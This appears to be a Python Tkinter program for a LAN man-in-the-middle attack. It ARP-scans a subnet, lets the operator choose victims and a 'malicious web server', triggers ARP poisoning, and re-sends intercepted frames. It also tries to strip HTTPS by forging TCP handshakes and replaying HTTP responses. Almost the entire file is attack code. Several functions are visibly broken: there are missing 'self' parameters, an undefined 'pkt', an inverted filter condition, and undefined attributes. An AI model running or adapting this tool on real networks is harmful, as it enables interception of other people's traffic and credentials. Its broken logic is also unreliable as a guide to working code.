from scapy.all import *
from poison import poison
import threading
from Tkinter import*
import sys
import os
from scapy.all import *
from scapy.layers.inet import IP
from scapy.layers.inet import TCP
#from scapy.layers.http import *
import threading
import time
import requests
import netifaces
from math import log




class sslStrip():
    def __init__(self, interface, root):
        self.interface = interface
        self.root = root
        
    def selMalWebSrv(self):
        self.maliciousWebServer = []
        for widget in self.root.winfo_children():
            widget.destroy()
        OPTIONS = []
        for pktSnd, pktRcv in self.usedIPs:
            OPTIONS.append(pktRcv[ARP].psrc)
        Label(self.root, text='Select the WebServer').pack()
        selectTargetIP = Listbox(self.root, selectmode="single", width=50)
        for each_item in range(len(OPTIONS)):
            selectTargetIP.insert(END, OPTIONS[each_item])
        selectTargetIP.pack()

        def get_target(self):
            for i in selectTargetIP.curselection():
                InIpArp = int(i)
                self.maliciousWebServer.append({"ip": self.usedIPs[InIpArp][1][ARP].psrc, "mac": self.usedIPs[InIpArp][1][ARP].hwsrc})
            self.myMAC = get_if_hwaddr(self.interface)
            proc_thread = None
            proc_thread = threading.Thread(target=self.startProcess)
            proc_thread.daemon = True
            proc_thread.start()

        def restart_program(self):
            python =sys.executable
            os.execl(python, python, * sys.argv)
        Button(self.root, text="Reset", command=lambda:restart_program(self)).pack(side=BOTTOM)

        Button(self.root, text="Execute", command=lambda:get_target(self)).pack()

    def select_arp_IP(self):
        self.target = []
        Label(self.root, text='Select the victim/victims').pack()
        OPTIONS = []
        for pktSnd, pktRcv in self.usedIPs:
            OPTIONS.append(pktRcv[ARP].psrc)

        select = Listbox(self.root, selectmode="multiple", width=50)
        for each_item in range(len(OPTIONS)):
            select.insert(END, OPTIONS[each_item])
        select.pack()

        def selectIpArp(self):
            for i in select.curselection():
                InIpArp = int(i)
                self.target.append(
                    {"ip": self.usedIPs[InIpArp][1][ARP].psrc, "mac": self.usedIPs[InIpArp][1][ARP].hwsrc})
            self.selMalWebSrv()

        def restart_program(self):
            python =sys.executable
            os.execl(python, python, * sys.argv)
        Button(self.root, text="Reset", command=lambda:restart_program(self)).pack(side=BOTTOM)

        Button(self.root, text="Execute", command=lambda:selectIpArp(self)).pack()

    def getInput(self):
        ipLabel = Label(self.root,
                        text='Enter the range of IPs (i.e.: 10.0.2.0/24)').pack()
        ipValue = Entry(self.root)
        ipValue.pack()

        def get_execute(self):
            self.rangeIPs = ipValue.get()
            self.usedIPs, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=self.rangeIPs), timeout=3,iface=self.interface)
            for widget in self.root.winfo_children():
                widget.destroy()
            self.select_arp_IP()

        def restart_program(self):
            python =sys.executable
            os.execl(python, python, * sys.argv)
        Button(self.root, text="Reset", command=lambda:restart_program(self)).pack(side=BOTTOM)
        Button(self.root, text="Execute", command=lambda:get_execute(self)).pack()

    def startProcess(self):
        for widget in self.root.winfo_children():
            widget.destroy()
        self.initShow()
        def restart_program(self):
            python =sys.executable
            os.execl(python, python, * sys.argv)
        Button(self.root, text="Reset", command=lambda:restart_program(self)).pack(side=BOTTOM)

        self.initThread()
        while True:
            sniff(store=0, prn=lambda packet: self.packetForwarding(packet), iface=self.interface)


    def ssl_filter(self, pkt):
        return TCP in pkt and pkt[TCP].dport == 80 and pkt[TCP].flags == 'S' and (pkt[IP].src in [victim["IP"] for victim in self.sslVictims])

    def initShow(self):
        scroll = Scrollbar(self.root)
        self.show = Text(self.root, wrap=NONE, yscrollcommand=scroll.set)
        scroll.config(command=self.show.yview)
        self.show.pack()
        self.show.see(END)
        self.show.update_idletasks()

    def initThread(self):
        proc_thread = None
        process = poison(self.interface, self.target, self.maliciousWebServer, self.myMAC)
        proc_thread = threading.Thread(target=process.poison)
        proc_thread.daemon = True
        proc_thread.start()

		
    def sslStrip(packet):
        syn_ack = IP(dst=packet[IP].src,  src = packet[IP].dst) / TCP(sport=packet[TCP].dport, dport = packet[TCP].sport,flags='SA', seq = 0, ack = packet[TCP].seq + 1)
        ack = sr1(syn_ack)
        packetHttp = sniff(filter = "port 80", count = 1)[0]
        ack = IP(dst=packet[IP].src, src =packet[IP].dst ) / TCP(dport=packetHttp.sport, sport=packetHttp[TCP].dport,seq=1, ack= packetHttp[TCP].seq + len(packetHttp[TCP].payload),flags='A')
        send(ack)
        if(HTTP in packetHttp):
            resp = sendRequest(packetHttp)
            load = resp.text
            response = IP(dst=packet[IP].src, src =packet[IP].dst ) / TCP(dport=packetHttp[TCP].sport, sport=packetHttp[TCP].dport,seq=ack[TCP].seq, ack= ack[TCP].ack, flags='A') /HTTP()/HTTPResponse(Content_Type = resp.headers['Content-Type'] if 'Content-Type' in resp.headers else None,Date = resp.headers['Date'] if 'Date' in resp.headers else None,Connection = 'keep-alive')/load
            response_payload = response[TCP].payload.do_build()
            base_seq = response[TCP].seq
            offset = 0
            for i in range(0, len(response_payload), 1500):
                respons = IP(dst=packet[IP].src, src =packet[IP].dst ) / TCP(dport=packetHttp[TCP].sport, sport=packetHttp[TCP].dport, seq=base_seq + offset, ack= ack[TCP].ack, flags='PA') / response_payload[i:i+1500]
                offset += len(response_payload[i:i+1500])
                send(respons, iface=self.interface)

    def sendRequest(pkt):
        if(HTTP in pkt and HTTPRequest in pkt[HTTP]):
            if(pkt[HTTP][HTTPRequest].Method == b"GET"):
                resp = requests.get("http://" + str(pkt[HTTP][HTTPRequest].Host.decode()) + str(pkt[HTTP][HTTPRequest].Path.decode()))
                return resp
		
    def packetForwarding(self, packet):
        
        if not TCP in pkt and pkt[TCP].dport == 80 and pkt[TCP].flags == 'S' and (pkt[IP].src in [victim["IP"] for victim in self.target]):
            sender= None
            senderfound = False
            receiver = None
            receiverfound = False
            for vict in self.target:
                if (vict["mac"] == packet[Ether].src):
                    sender, senderfound = self.SndFound(vict)
                    if (self.maliciousWebServer[0]["ip"] == packet[IP].dst):
                        receiver, receiverfound = self.rcvFound(self.maliciousWebServer[0])
            if ((not senderfound) or (not receiverfound)):
                if (self.maliciousWebServer[0]["mac"] == packet[Ether].src):
                    sender, senderfound = self.SndFound(self.maliciousWebServer[0])
                    for vict in self.target:
                        if (vict["ip"] == packet[IP].dst):
                            receiver, receiverfound = self.rcvFound(vict)
            if (senderfound and receiverfound):
                self.modifyAndSend(packet, sender, receiver)
        else: sslStrip(packet)

    def rcvFound(self, subj):
        receiver = subj
        receiverfound = True
        return receiver,receiverfound

    def SndFound(self, subj):
        sender = subj
        senderfound = True
        return sender,senderfound

    def modifyAndSend(self, packet, sender, receiver):
        packet[Ether].src = self.myMAC
        packet[Ether].dst = receiver["mac"]
        sendp(packet, iface=self.interface, verbose=False)
        self.show.insert(END, "Redirect from ip: {}, mac: {}".format(sender["ip"], sender["mac"]) + '\n')
        self.show.insert(END, "to ip: {}, mac: {}".format(receiver["ip"], receiver["mac"]) + '\n')                                                                    
        self.show.insert(END,'\n')                                                                    
        self.show.see(END)
        self.show.update_idletasks()

    def setInput(self, rangeIPs, usedIPs, target, maliciousWebServer, myMAC):
        self.rangeIPs = rangeIPs
        self.usedIPs = usedIPs
        self.target = target
        self.maliciousWebServer = maliciousWebServer
        self.myMAC = myMAC
    